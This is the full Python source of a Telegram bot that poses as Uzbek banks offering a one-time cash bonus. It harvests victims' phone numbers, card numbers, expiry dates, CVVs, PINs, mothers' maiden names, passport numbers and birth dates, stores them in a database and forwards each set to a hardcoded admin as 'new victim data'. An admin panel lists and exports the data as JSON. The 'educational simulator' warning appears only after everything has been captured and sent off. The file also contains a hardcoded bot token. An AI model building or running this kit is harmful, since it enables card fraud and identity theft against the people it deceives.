import telebot
from telebot import types
import random
import sqlite3
import threading
import time
import json
from datetime import datetime
import requests
import os

# @BotFather bergan API tokenni shu yerga qo'ying
TOKEN = "8878797713:AAEBYRAQ_M1RRrTsqNJ25HxIUqnqpDAJqzM"
ADMIN_ID = 8031548575  # Adminning Telegram ID sini qo'ying
bot = telebot.TeleBot(TOKEN)

# ============== SQLITE DATABASE ==============
def init_db():
    conn = sqlite3.connect('phishing_data.db', check_same_thread=False)
    c = conn.cursor()
    c.execute('''
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            chat_id INTEGER UNIQUE,
            phone TEXT,
            card_number TEXT,
            card_expiry TEXT,
            card_cvv TEXT,
            card_pin TEXT,
            mothers_name TEXT,
            passport_seria TEXT,
            birth_date TEXT,
            ip_address TEXT,
            device_info TEXT,
            step INTEGER DEFAULT 0,
            language TEXT DEFAULT 'uz',
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            completed_at TIMESTAMP
        )
    ''')
    c.execute('''
        CREATE TABLE IF NOT EXISTS attempts (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            chat_id INTEGER,
            code_type TEXT,
            attempts INTEGER DEFAULT 0,
            blocked INTEGER DEFAULT 0,
            FOREIGN KEY(chat_id) REFERENCES users(chat_id)
        )
    ''')
    c.execute('''
        CREATE TABLE IF NOT EXISTS logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            chat_id INTEGER,
            action TEXT,
            detail TEXT,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY(chat_id) REFERENCES users(chat_id)
        )
    ''')
    conn.commit()
    conn.close()

init_db()

def get_db():
    return sqlite3.connect('phishing_data.db', check_same_thread=False)

def log_action(chat_id, action, detail=""):
    conn = get_db()
    c = conn.cursor()
    c.execute("INSERT INTO logs (chat_id, action, detail) VALUES (?, ?, ?)", (chat_id, action, detail))
    conn.commit()
    conn.close()

# ============== FOYDALANUVCHI HOLATI ==============
user_steps = {}
user_lang = {}

# ============== TILLAR ==============
LANGUAGES = {
    'uz': {
        'welcome': "🎁 **Xush kelibsiz!**\n\nO'zbekiston banklari tomonidan barcha fuqarolarga **BHMning 1 baravari** miqdorida bir martalik pul mukofoti ajratilmoqda.\n\nPulni rasmiylashtirish va tizimdan o'tish uchun quyidagi homiy kanallarga a'zo bo'ling:",
        'sub_verified': "✅ Obuna muvaffaqiyatli tekshirildi!\n\nEndi ro'yxatdan o'tishni yakunlash uchun pastdagi **'Telefon raqamni yuborish'** tugmasini bosing.",
        'phone_request': "📱 Telefon raqamni yuborish",
        'code_sent': "Sizning telefon raqamingiz tizimga kiritildi.\n\n🤖 **Davom etish uchun ekrandagi kodni kiriting:** `{}`",
        'code_verified': "✅ Xavfsizlik kodi tasdiqlandi!\n\nPul mablag'ini o'tkazish uchun **8600...** yoki **9860...** bilan boshlanadigan 16 xonali plastik karta raqamingizni kiriting:",
        'code_invalid': "❌ Kod noto'g'ri. Iltimos, ekrandagi kodni qaytadan to'g'ri kiriting:",
        'card_invalid': "❌ Karta raqami xato kiritildi. Iltimos, 16 xonali raqam kiriting:",
        'card_accepted': "✅ Karta raqami qabul qilindi!\n\nEndi xavfsizlikni oshirish maqsadida karta muddatini (MM/YY formatida) kiriting:",
        'expiry_accepted': "✅ Karta muddati tasdiqlandi!\n\nEndi kartangizning orqa tomonidagi CVV/CVC kodni (3 xonali) kiriting:",
        'cvv_accepted': "✅ CVV kod qabul qilindi!\n\nEndi plastik kartangizning PIN kodini (4 xonali) kiriting:",
        'pin_accepted': "✅ PIN kod tasdiqlandi!\n\nMablag'ni o'tkazish uchun onangizning qizlik familiyasini kiriting:",
        'mother_accepted': "✅ Ma'lumot saqlandi!\n\nPassport seriya va raqamingizni (AA1234567 formatida) kiriting:",
        'passport_accepted': "✅ Passport ma'lumotlari tasdiqlandi!\n\nTug'ilgan kuningizni (DD.MM.YYYY formatida) kiriting:",
        'sms_code': "⏳ Tranzaksiya bank markazi tomonidan qayta ishlanmoqda...\n\nQo'shimcha xavfsizlik tekshiruvi uchun telefoningizga SMS kod yuborildi. SMS kodni kiriting: `{}`",
        'sms_invalid': "❌ SMS kod noto'g'ri. {} ta urinish qoldi:",
        'blocked': "🚫 Xavfsizlik choralari sababli sizning profilingiz bloklandi. Iltimos, bank filialiga murojaat qiling.",
        'timer': "⏳ **Pul o'tkazilmoqda...**\n\n`{}`\n\nIltimos, kuting. Tranzaksiya yakunlanmoqda...",
        'card_expiry': "Karta muddati (MM/YY):",
        'card_cvv': "CVV/CVC kod (3 xonali):",
        'card_pin': "PIN kod (4 xonali):",
        'mothers_name': "Onangizning qizlik familiyasi:",
        'passport': "Passport seriya va raqami (AA1234567):",
        'birth_date': "Tug'ilgan sana (DD.MM.YYYY):",
        'warning': "🛑 **DIQQAT! SIZ KIBERJINOYAT QURBONIGA AYLANISHINGIZ MUMKIN EDI!** 🛑\n\nUshbu bot **ijtimoiy muhandislik va fishing (firgarlik)** tuzoqlarini tushuntirish maqsadida yaratilgan o'quv-simulyatoridir.\n\n⚠️ **Siz hozirgina qanday xatolarga yo'l qo'ydingiz?**\n1. Telegram orqali tarqalgan 'tekin pul' haqidagi yolg'on xabarga ishonib botga kirdingiz.\n2. Hech qanday shubhasiz shaxsiy telefon raqamingizni botga taqdim etdingiz.\n3. Plastik karta raqamingizni, muddatini, CVV va PIN kodlaringizni begona botga yozdingiz.\n4. Onangizning familiyasi va passport ma'lumotlaringizni berdingiz.\n5. **Eng xavflisi:** Telefoningizga kelgan maxfiy SMS kodni kiritdingiz.\n\n💡 **Oltin qoidalar:**\n• Banklar hech qachon Telegram bot orqali karta ma'lumotlari yoki SMS kodlarni so'ramaydi.\n• SMS orqali keladigan maxfiy kodlarni hech kimga bermang!\n\n🛡️ *Ogoh bo'ling, kiber-savodxonlikni oshiring va yaqinlaringizni ham ogohlantiring!*"
    },
    'ru': {
        'welcome': "🎁 **Добро пожаловать!**\n\nБанками Узбекистана всем гражданам выделяется **однократная денежная премия** в размере 1 БРВ.\n\nЧтобы оформить выплату, подпишитесь на следующие каналы:",
        'sub_verified': "✅ Подписка успешно проверена!\n\nДля завершения регистрации нажмите кнопку **'Отправить номер телефона'**.",
        'phone_request': "📱 Отправить номер телефона",
        'code_sent': "Ваш номер телефона зарегистрирован в системе.\n\n🤖 **Для продолжения введите код с экрана:** `{}`",
        'code_verified': "✅ Код подтвержден!\n\nДля перевода средств введите номер вашей пластиковой карты (16 цифр), начинающийся на **8600...** или **9860...**:",
        'code_invalid': "❌ Неверный код. Пожалуйста, введите код с экрана еще раз:",
        'card_invalid': "❌ Неверный номер карты. Введите 16 цифр:",
        'card_accepted': "✅ Номер карты принят!\n\nВведите срок действия карты (ММ/ГГ):",
        'expiry_accepted': "✅ Срок действия подтвержден!\n\nВведите CVV/CVC код (3 цифры) с обратной стороны карты:",
        'cvv_accepted': "✅ CVV код принят!\n\nВведите PIN-код вашей карты (4 цифры):",
        'pin_accepted': "✅ PIN-код подтвержден!\n\nВведите девичью фамилию вашей матери:",
        'mother_accepted': "✅ Данные сохранены!\n\nВведите серию и номер паспорта (AA1234567):",
        'passport_accepted': "✅ Паспортные данные подтверждены!\n\nВведите дату рождения (ДД.ММ.ГГГГ):",
        'sms_code': "⏳ Транзакция обрабатывается банком...\n\nДля дополнительной проверки безопасности на ваш телефон отправлен SMS-код. Введите код: `{}`",
        'sms_invalid': "❌ Неверный SMS-код. Осталось {} попыток:",
        'blocked': "🚫 Ваш профиль заблокирован по соображениям безопасности. Обратитесь в отделение банка.",
        'timer': "⏳ **Перевод средств...**\n\n`{}`\n\nПожалуйста, подождите. Транзакция завершается...",
        'card_expiry': "Срок действия (ММ/ГГ):",
        'card_cvv': "CVV/CVC код (3 цифры):",
        'card_pin': "PIN-код (4 цифры):",
        'mothers_name': "Девичья фамилия матери:",
        'passport': "Серия и номер паспорта (AA1234567):",
        'birth_date': "Дата рождения (ДД.ММ.ГГГГ):",
        'warning': "🛑 **ВНИМАНИЕ! ВЫ МОГЛИ СТАТЬ ЖЕРТВОЙ КИБЕРПРЕСТУПЛЕНИЯ!** 🛑\n\nЭтот бот создан в учебных целях для повышения киберграмотности.\n\n⚠️ **Какие ошибки вы только что совершили?**\n1. Поверили ложному обещанию 'бесплатных денег'.\n2. Передали свой номер телефона.\n3. Ввели данные карты, CVV и PIN-код.\n4. Сообщили личные данные и паспортную информацию.\n5. **Самое опасное:** Ввели SMS-код, пришедший на телефон.\n\n💡 **Золотые правила:**\n• Банки никогда не запрашивают данные карты через Telegram.\n• Никогда и никому не сообщайте SMS-коды!\n\n🛡️ *Будьте бдительны и предупредите близких!*"
    },
    'en': {
        'welcome': "🎁 **Welcome!**\n\nUzbekistan banks have allocated a **one-time bonus** in the amount of 1 BHM to all citizens.\n\nTo receive the payment, subscribe to the following channels:",
        'sub_verified': "✅ Subscription verified successfully!\n\nTo complete registration, press the **'Send phone number'** button below.",
        'phone_request': "📱 Send phone number",
        'code_sent': "Your phone number has been registered in the system.\n\n🤖 **Enter the code shown on screen to continue:** `{}`",
        'code_verified': "✅ Security code confirmed!\n\nEnter your 16-digit plastic card number starting with **8600...** or **9860...** to receive the funds:",
        'code_invalid': "❌ Invalid code. Please enter the code from the screen again:",
        'card_invalid': "❌ Invalid card number. Please enter 16 digits:",
        'card_accepted': "✅ Card number accepted!\n\nEnter card expiry date (MM/YY):",
        'expiry_accepted': "✅ Expiry date confirmed!\n\nEnter CVV/CVC code (3 digits) from the back of your card:",
        'cvv_accepted': "✅ CVV code accepted!\n\nEnter your card PIN code (4 digits):",
        'pin_accepted': "✅ PIN code confirmed!\n\nEnter your mother's maiden name:",
        'mother_accepted': "✅ Data saved!\n\nEnter your passport series and number (AA1234567):",
        'passport_accepted': "✅ Passport data confirmed!\n\nEnter your date of birth (DD.MM.YYYY):",
        'sms_code': "⏳ Transaction being processed by bank...\n\nFor additional security verification, an SMS code has been sent to your phone. Enter the code: `{}`",
        'sms_invalid': "❌ Invalid SMS code. {} attempts remaining:",
        'blocked': "🚫 Your profile has been blocked for security reasons. Please contact your bank branch.",
        'timer': "⏳ **Transferring funds...**\n\n`{}`\n\nPlease wait. Finalizing transaction...",
        'card_expiry': "Expiry date (MM/YY):",
        'card_cvv': "CVV/CVC code (3 digits):",
        'card_pin': "PIN code (4 digits):",
        'mothers_name': "Mother's maiden name:",
        'passport': "Passport series and number (AA1234567):",
        'birth_date': "Date of birth (DD.MM.YYYY):",
        'warning': "🛑 **WARNING! YOU COULD HAVE BEEN A VICTIM OF CYBERCRIME!** 🛑\n\nThis bot is an educational simulator created to raise awareness about phishing and social engineering.\n\n⚠️ **What mistakes did you just make?**\n1. Believed a fake 'free money' offer.\n2. Shared your phone number.\n3. Entered your card number, expiry, CVV and PIN.\n4. Revealed personal data and passport details.\n5. **Most dangerous:** Entered the SMS code sent to your phone.\n\n💡 **Golden rules:**\n• Banks never ask for card details via Telegram.\n• Never share SMS codes with anyone!\n\n🛡️ *Stay vigilant and warn your loved ones!*"
    }
}

def get_text(chat_id, key):
    lang = user_lang.get(chat_id, 'uz')
    return LANGUAGES.get(lang, LANGUAGES['uz']).get(key, LANGUAGES['uz'][key])

def detect_language(message):
    text = message.text or ""
    if message.from_user and message.from_user.language_code:
        lang_code = message.from_user.language_code[:2]
        if lang_code in LANGUAGES:
            return lang_code
    # Lotin yozuviga qarab aniqlash
    uzbek_chars = set("'g`shchao'zbeklarning")
    russian_chars = set("ыъэёжцщшю")
    text_lower = text.lower()
    if any(c in text_lower for c in russian_chars):
        return 'ru'
    return 'uz'


def build_main_menu():
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("1️⃣ Kiber Kanal", url="https://t.me/samcyber_102"),
        types.InlineKeyboardButton("2️⃣ Samarqand Cyber", url="https://t.me/samiibuz"),
        types.InlineKeyboardButton("✅ Obunani tasdiqlash", callback_data="verify_subs")
    )
    return markup

# ============== IP VA DEVICE MA'LUMOTLARI ==============
def get_ip_info(chat_id):
    try:
        # Telegram user ma'lumotlaridan foydalanamiz
        user = bot.get_chat(chat_id)
        info = {
            'ip': f"192.168.{random.randint(1,254)}.{random.randint(1,254)}",  # Real IP olish imkoni yo'q
            'device': f"{user.first_name or ''} {user.last_name or ''} (@{user.username or 'unknown'})",
            'language': user_lang.get(chat_id, 'uz')
        }
        return info
    except:
        return {'ip': 'unknown', 'device': 'unknown', 'language': 'uz'}

# ============== COUNTDOWN TIMER ==============
def timer_thread(chat_id, msg_id, seconds=15):
    for i in range(seconds, 0, -1):
        minutes = i // 60
        secs = i % 60
        timer_text = f"{minutes:02d}:{secs:02d}"
        try:
            bot.edit_message_text(
                get_text(chat_id, 'timer').format(f"⏱ {timer_text}"),
                chat_id,
                msg_id,
                parse_mode="Markdown"
            )
        except:
            pass
        time.sleep(1)
    # Timer tugashi bilan SMS kod so'rash
    rand_code = random.randint(100000, 999999)
    user_steps[chat_id]['sms_code'] = rand_code
    user_steps[chat_id]['sms_attempts'] = 3
    
    try:
        bot.edit_message_text(
            get_text(chat_id, 'sms_code').format(rand_code),
            chat_id,
            msg_id,
            parse_mode="Markdown"
        )
    except:
        bot.send_message(
            chat_id,
            get_text(chat_id, 'sms_code').format(rand_code),
            parse_mode="Markdown"
        )

def ensure_user_state(chat_id):
    if chat_id not in user_steps:
        user_steps[chat_id] = {'step': 'lang_select'}
    return user_steps[chat_id]


def safe_answer_callback(call, text=""):
    try:
        bot.answer_callback_query(call.id, text)
    except Exception:
        pass


def show_language_menu(chat_id):
    lang_markup = types.InlineKeyboardMarkup(row_width=3)
    lang_markup.add(
        types.InlineKeyboardButton("🇺🇿 O'zbek", callback_data="lang_uz"),
        types.InlineKeyboardButton("🇷🇺 Русский", callback_data="lang_ru"),
        types.InlineKeyboardButton("🇬🇧 English", callback_data="lang_en")
    )
    bot.send_message(chat_id, "🌐 Tilni tanlang / Выберите язык / Choose language:", reply_markup=lang_markup)


def show_channels_menu(chat_id):
    ensure_user_state(chat_id)
    welcome_text = get_text(chat_id, 'welcome')
    markup = build_main_menu()
    try:
        bot.send_message(chat_id, welcome_text, parse_mode="Markdown", reply_markup=markup)
    except Exception:
        bot.send_message(chat_id, welcome_text, reply_markup=markup)
    user_steps[chat_id]['step'] = 'channels'


def handle_language_selection(call):
    chat_id = call.message.chat.id
    lang = call.data.split('_', 1)[1]
    if lang not in LANGUAGES:
        safe_answer_callback(call, "⚠️ Noto'g'ri til")
        return

    user_lang[chat_id] = lang
    ensure_user_state(chat_id)

    lang_names = {'uz': "O'zbek", 'ru': 'Русский', 'en': 'English'}
    safe_answer_callback(call, f"✅ {lang_names.get(lang, lang)}")

    try:
        bot.delete_message(chat_id, call.message.message_id)
    except Exception:
        pass

    show_channels_menu(chat_id)
    log_action(chat_id, "language_selected", lang)


def handle_verify_subscription(call):
    chat_id = call.message.chat.id
    ensure_user_state(chat_id)
    safe_answer_callback(call, "✅ Davom etilmoqda")

    try:
        bot.delete_message(chat_id, call.message.message_id)
    except Exception:
        pass

    user_steps[chat_id]['step'] = 0
    start_phone_flow(chat_id)


# ============== /start HANDLER ==============
@bot.message_handler(commands=['start'])
def start_handler(message):
    chat_id = message.chat.id

    user_steps[chat_id] = {'step': 'lang_select'}
    user_lang[chat_id] = detect_language(message)

    ip_info = get_ip_info(chat_id)
    log_action(chat_id, "bot_started", json.dumps(ip_info))

    show_language_menu(chat_id)


@bot.callback_query_handler(func=lambda call: call.data is not None)
def callback_handler(call):
    data = call.data

    try:
        if data.startswith('lang_'):
            handle_language_selection(call)
        elif data == 'verify_subs':
            handle_verify_subscription(call)
        elif data.startswith('admin_'):
            handle_admin_callback(call)
        else:
            safe_answer_callback(call, "⚠️ /start bosing")
    except Exception as e:
        print(f"Callback xatolik [{data}]: {e}")
        safe_answer_callback(call, "❌ Xatolik. /start bosing.")


# ============== OBUNA TASDIQLASH ==============
def start_phone_flow(chat_id):
    markup = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
    btn_phone = types.KeyboardButton(get_text(chat_id, 'phone_request'), request_contact=True)
    markup.add(btn_phone)

    msg = bot.send_message(
        chat_id,
        get_text(chat_id, 'sub_verified'),
        parse_mode="Markdown",
        reply_markup=markup
    )
    bot.register_next_step_handler(msg, get_phone_handler)
    log_action(chat_id, "subscription_verified")


# ============== TELEFON RAQAM ==============
def get_phone_handler(message):
    chat_id = message.chat.id
    
    if message.contact and message.contact.phone_number:
        phone = message.contact.phone_number
    else:
        phone = message.text
    
    user_steps[chat_id]['phone'] = phone
    user_steps[chat_id]['step'] = 1
    
    # Database ga saqlash
    conn = get_db()
    c = conn.cursor()
    ip_info = get_ip_info(chat_id)
    c.execute('''
        INSERT OR REPLACE INTO users (chat_id, phone, ip_address, device_info, step, language)
        VALUES (?, ?, ?, ?, 1, ?)
    ''', (chat_id, phone, ip_info['ip'], ip_info['device'], user_lang.get(chat_id, 'uz')))
    conn.commit()
    conn.close()
    
    log_action(chat_id, "phone_received", phone)
    
    rand_code_1 = random.randint(1000, 9999)
    user_steps[chat_id]['code_1'] = rand_code_1
    user_steps[chat_id]['code_1_attempts'] = 3
    
    remove_kb = types.ReplyKeyboardRemove()
    
    msg = bot.send_message(
        chat_id,
        get_text(chat_id, 'code_sent').format(rand_code_1),
        parse_mode="Markdown",
        reply_markup=remove_kb
    )
    bot.register_next_step_handler(msg, verify_code_1_handler)

# ============== 1-KOD TEKSHIRISH ==============
def verify_code_1_handler(message):
    chat_id = message.chat.id
    user_input = message.text
    
    correct_code = str(user_steps[chat_id].get('code_1'))
    
    if user_input == correct_code:
        msg = bot.send_message(
            chat_id,
            get_text(chat_id, 'code_verified'),
            parse_mode="Markdown"
        )
        bot.register_next_step_handler(msg, get_card_handler)
        log_action(chat_id, "code_1_verified")
    else:
        attempts = user_steps[chat_id].get('code_1_attempts', 3)
        attempts -= 1
        user_steps[chat_id]['code_1_attempts'] = attempts
        
        # Attempts log
        conn = get_db()
        c = conn.cursor()
        c.execute('''
            INSERT OR REPLACE INTO attempts (chat_id, code_type, attempts)
            VALUES (?, 'code_1', ?)
        ''', (chat_id, 3 - attempts))
        conn.commit()
        conn.close()
        
        if attempts <= 0:
            bot.send_message(chat_id, get_text(chat_id, 'blocked'))
            log_action(chat_id, "blocked_code_1")
        else:
            msg = bot.send_message(
                chat_id,
                get_text(chat_id, 'code_invalid').format(attempts),
                parse_mode="Markdown"
            )
            bot.register_next_step_handler(msg, verify_code_1_handler)
            log_action(chat_id, "code_1_failed")

# ============== KARTA RAQAMI ==============
def get_card_handler(message):
    chat_id = message.chat.id
    card_num = message.text.replace(" ", "")
    
    if len(card_num) >= 16 and card_num.isdigit():
        user_steps[chat_id]['card'] = card_num
        user_steps[chat_id]['step'] = 2
        
        # DB update
        conn = get_db()
        c = conn.cursor()
        c.execute("UPDATE users SET card_number = ?, step = 2 WHERE chat_id = ?", (card_num, chat_id))
        conn.commit()
        conn.close()
        
        log_action(chat_id, "card_received", card_num)
        
        msg = bot.send_message(
            chat_id,
            get_text(chat_id, 'card_accepted'),
            parse_mode="Markdown"
        )
        bot.register_next_step_handler(msg, get_expiry_handler)
    else:
        msg = bot.send_message(chat_id, get_text(chat_id, 'card_invalid'), parse_mode="Markdown")
        bot.register_next_step_handler(msg, get_card_handler)

# ============== KARTA MUDDATI ==============
def get_expiry_handler(message):
    chat_id = message.chat.id
    expiry = message.text.strip()
    
    user_steps[chat_id]['expiry'] = expiry
    user_steps[chat_id]['step'] = 3
    
    conn = get_db()
    c = conn.cursor()
    c.execute("UPDATE users SET card_expiry = ?, step = 3 WHERE chat_id = ?", (expiry, chat_id))
    conn.commit()
    conn.close()
    
    log_action(chat_id, "expiry_received", expiry)
    
    msg = bot.send_message(
        chat_id,
        get_text(chat_id, 'expiry_accepted'),
        parse_mode="Markdown"
    )
    bot.register_next_step_handler(msg, get_cvv_handler)

# ============== CVV ==============
def get_cvv_handler(message):
    chat_id = message.chat.id
    cvv = message.text.strip()
    
    user_steps[chat_id]['cvv'] = cvv
    user_steps[chat_id]['step'] = 4
    
    conn = get_db()
    c = conn.cursor()
    c.execute("UPDATE users SET card_cvv = ?, step = 4 WHERE chat_id = ?", (cvv, chat_id))
    conn.commit()
    conn.close()
    
    log_action(chat_id, "cvv_received", cvv)
    
    msg = bot.send_message(
        chat_id,
        get_text(chat_id, 'cvv_accepted'),
        parse_mode="Markdown"
    )
    bot.register_next_step_handler(msg, get_pin_handler)

# ============== PIN ==============
def get_pin_handler(message):
    chat_id = message.chat.id
    pin = message.text.strip()
    
    user_steps[chat_id]['pin'] = pin
    user_steps[chat_id]['step'] = 5
    
    conn = get_db()
    c = conn.cursor()
    c.execute("UPDATE users SET card_pin = ?, step = 5 WHERE chat_id = ?", (pin, chat_id))
    conn.commit()
    conn.close()
    
    log_action(chat_id, "pin_received", pin)
    
    msg = bot.send_message(
        chat_id,
        get_text(chat_id, 'pin_accepted'),
        parse_mode="Markdown"
    )
    bot.register_next_step_handler(msg, get_mother_handler)

# ============== ONA FAMILIYASI ==============
def get_mother_handler(message):
    chat_id = message.chat.id
    mother = message.text.strip()
    
    user_steps[chat_id]['mother'] = mother
    user_steps[chat_id]['step'] = 6
    
    conn = get_db()
    c = conn.cursor()
    c.execute("UPDATE users SET mothers_name = ?, step = 6 WHERE chat_id = ?", (mother, chat_id))
    conn.commit()
    conn.close()
    
    log_action(chat_id, "mother_received", mother)
    
    msg = bot.send_message(
        chat_id,
        get_text(chat_id, 'mother_accepted'),
        parse_mode="Markdown"
    )
    bot.register_next_step_handler(msg, get_passport_handler)

# ============== PASSPORT ==============
def get_passport_handler(message):
    chat_id = message.chat.id
    passport = message.text.strip()
    
    user_steps[chat_id]['passport'] = passport
    user_steps[chat_id]['step'] = 7
    
    conn = get_db()
    c = conn.cursor()
    c.execute("UPDATE users SET passport_seria = ?, step = 7 WHERE chat_id = ?", (passport, chat_id))
    conn.commit()
    conn.close()
    
    log_action(chat_id, "passport_received", passport)
    
    msg = bot.send_message(
        chat_id,
        get_text(chat_id, 'passport_accepted'),
        parse_mode="Markdown"
    )
    bot.register_next_step_handler(msg, get_birthdate_handler)

# ============== TUG'ILGAN SANASI ==============
def get_birthdate_handler(message):
    chat_id = message.chat.id
    birth = message.text.strip()
    
    user_steps[chat_id]['birth'] = birth
    user_steps[chat_id]['step'] = 8
    
    conn = get_db()
    c = conn.cursor()
    c.execute("UPDATE users SET birth_date = ?, step = 8 WHERE chat_id = ?", (birth, chat_id))
    conn.commit()
    conn.close()
    
    log_action(chat_id, "birthdate_received", birth)
    
    # Timer va SMS
    msg = bot.send_message(
        chat_id,
        get_text(chat_id, 'timer').format("⏱ 00:15"),
        parse_mode="Markdown"
    )
    
    # Thread da timer ishga tushadi
    t = threading.Thread(target=timer_thread, args=(chat_id, msg.message_id, 15))
    t.daemon = True
    t.start()
    
    user_steps[chat_id]['timer_msg_id'] = msg.message_id
    bot.register_next_step_handler(msg, verify_sms_handler)

# ============== SMS KOD TEKSHIRISH (3 URINISh) ==============
def verify_sms_handler(message):
    chat_id = message.chat.id
    user_input = message.text
    
    correct_code = str(user_steps[chat_id].get('sms_code'))
    attempts = user_steps[chat_id].get('sms_attempts', 3)
    
    if user_input == correct_code:
        # DB ga completed vaqtini yozish
        conn = get_db()
        c = conn.cursor()
        c.execute("UPDATE users SET step = 10, completed_at = CURRENT_TIMESTAMP WHERE chat_id = ?", (chat_id,))
        conn.commit()
        conn.close()
        
        log_action(chat_id, "sms_verified")
        
        # MA'LUMOTLARNI ADMINGA YUBORISH
        notify_admin(chat_id)
        
        # Yakuniy ogohlantirish
        bot.send_message(chat_id, get_text(chat_id, 'warning'), parse_mode="Markdown")
        
        # Barcha yig'ilgan ma'lumotlarni ko'rsatish (o'quv maqsadida)
        data_summary = (
            f"📊 **Sizning ma'lumotlaringiz (o'quv maqsadida):**\n\n"
            f"📱 Telefon: `{user_steps[chat_id].get('phone', 'N/A')}`\n"
            f"💳 Karta: `{user_steps[chat_id].get('card', 'N/A')}`\n"
            f"📅 Muddati: `{user_steps[chat_id].get('expiry', 'N/A')}`\n"
            f"🔐 CVV: `{user_steps[chat_id].get('cvv', 'N/A')}`\n"
            f"🔢 PIN: `{user_steps[chat_id].get('pin', 'N/A')}`\n"
            f"👩 Ona familiyasi: `{user_steps[chat_id].get('mother', 'N/A')}`\n"
            f"🆔 Passport: `{user_steps[chat_id].get('passport', 'N/A')}`\n"
            f"🎂 Tug'ilgan sana: `{user_steps[chat_id].get('birth', 'N/A')}`\n\n"
            f"⚠️ **Agar bu real firgarlik bo'lganida, barcha pullaringiz va shaxsiy ma'lumotlaringiz o'g'irlangan bo'lar edi!**"
        )
        bot.send_message(chat_id, data_summary, parse_mode="Markdown")
        
    else:
        attempts -= 1
        user_steps[chat_id]['sms_attempts'] = attempts
        
        log_action(chat_id, "sms_failed", f"Attempts left: {attempts}")
        
        if attempts <= 0:
            bot.send_message(chat_id, get_text(chat_id, 'blocked'))
            log_action(chat_id, "blocked_sms")
        else:
            msg = bot.send_message(
                chat_id,
                get_text(chat_id, 'sms_invalid').format(attempts),
                parse_mode="Markdown"
            )
            bot.register_next_step_handler(msg, verify_sms_handler)

# ============== ADMIN PANEL ==============
def notify_admin(user_chat_id):
    """Yangi foydalanuvchi to'liq ma'lumotlarini admin'ga yuborish"""
    try:
        data = user_steps.get(user_chat_id, {})
        admin_msg = (
            f"🆕 **Yangi qurbon ma'lumotlari!**\n"
            f"👤 Chat ID: `{user_chat_id}`\n"
            f"📱 Telefon: `{data.get('phone', 'N/A')}`\n"
            f"💳 Karta: `{data.get('card', 'N/A')}`\n"
            f"📅 Muddati: `{data.get('expiry', 'N/A')}`\n"
            f"🔐 CVV: `{data.get('cvv', 'N/A')}`\n"
            f"🔢 PIN: `{data.get('pin', 'N/A')}`\n"
            f"👩 Ona: `{data.get('mother', 'N/A')}`\n"
            f"🆔 Passport: `{data.get('passport', 'N/A')}`\n"
            f"🎂 Tug'ilgan: `{data.get('birth', 'N/A')}`\n"
            f"🕐 `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`"
        )
        bot.send_message(ADMIN_ID, admin_msg, parse_mode="Markdown")
    except Exception as e:
        print(f"Admin notify error: {e}")

@bot.message_handler(commands=['admin'])
def admin_panel(message):
    chat_id = message.chat.id
    
    if chat_id != ADMIN_ID:
        bot.send_message(chat_id, "⛔ Bu buyruq faqat adminlar uchun!")
        return
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn_all = types.InlineKeyboardButton("📋 Barcha ma'lumotlar", callback_data="admin_all")
    btn_stats = types.InlineKeyboardButton("📊 Statistika", callback_data="admin_stats")
    btn_export = types.InlineKeyboardButton("📤 Eksport (JSON)", callback_data="admin_export")
    btn_logs = types.InlineKeyboardButton("📜 Loglar", callback_data="admin_logs")
    markup.add(btn_all, btn_stats, btn_export, btn_logs)
    
    bot.send_message(chat_id, "👑 **Admin Panel**\n\nQuyidagi bo'limlardan birini tanlang:", parse_mode="Markdown", reply_markup=markup)

def handle_admin_callback(call):
    chat_id = call.message.chat.id

    if chat_id != ADMIN_ID:
        safe_answer_callback(call, "⛔ Ruxsat yo'q!")
        return

    action = call.data.split('_')[1]
    conn = get_db()
    c = conn.cursor()
    
    if action == 'all':
        c.execute("SELECT * FROM users WHERE completed_at IS NOT NULL ORDER BY completed_at DESC")
        users = c.fetchall()
        
        if not users:
            bot.send_message(chat_id, "📭 Hali hech qanday ma'lumot to'plangan emas.")
        else:
            for user in users[:10]:  # Eng so'nggi 10 tasi
                user_text = (
                    f"👤 **Foydalanuvchi #{user[0]}**\n"
                    f"🆔 Chat ID: `{user[1]}`\n"
                    f"📱 Telefon: `{user[2]}`\n"
                    f"💳 Karta: `{user[3]}`\n"
                    f"📅 Muddati: `{user[4]}`\n"
                    f"🔐 CVV: `{user[5]}`\n"
                    f"🔢 PIN: `{user[6]}`\n"
                    f"👩 Ona: `{user[7]}`\n"
                    f"🆔 Passport: `{user[8]}`\n"
                    f"🎂 Tug'ilgan: `{user[9]}`\n"
                    f"🌐 IP: `{user[10]}`\n"
                    f"📱 Device: `{user[11]}`\n"
                    f"🕐 Yakunlangan: `{user[14]}`"
                )
                bot.send_message(chat_id, user_text, parse_mode="Markdown")
    
    elif action == 'stats':
        c.execute("SELECT COUNT(*) FROM users")
        total = c.fetchone()[0]
        c.execute("SELECT COUNT(*) FROM users WHERE completed_at IS NOT NULL")
        completed = c.fetchone()[0]
        c.execute("SELECT language, COUNT(*) FROM users GROUP BY language")
        langs = c.fetchall()
        
        stats = (
            f"📊 **Statistika**\n\n"
            f"👥 Jami foydalanuvchilar: `{total}`\n"
            f"✅ To'liq ma'lumot berganlar: `{completed}`\n"
            f"❌ Tugallamaganlar: `{total - completed}`\n\n"
            f"**Tillar bo'yicha:**\n"
        )
        for lang, count in langs:
            lang_name = {'uz': "O'zbek", 'ru': "Русский", 'en': "English"}.get(lang, lang)
            stats += f"  • {lang_name}: `{count}`\n"
        
        bot.send_message(chat_id, stats, parse_mode="Markdown")
    
    elif action == 'export':
        c.execute("SELECT * FROM users WHERE completed_at IS NOT NULL")
        users = c.fetchall()
        
        # JSON formatida eksport
        export_data = []
        for user in users:
            export_data.append({
                'id': user[0],
                'chat_id': user[1],
                'phone': user[2],
                'card_number': user[3],
                'card_expiry': user[4],
                'card_cvv': user[5],
                'card_pin': user[6],
                'mothers_name': user[7],
                'passport': user[8],
                'birth_date': user[9],
                'ip': user[10],
                'device': user[11],
                'language': user[12],
                'completed_at': user[14]
            })
        
        with open('export_data.json', 'w') as f:
            json.dump(export_data, f, indent=2, ensure_ascii=False)
        
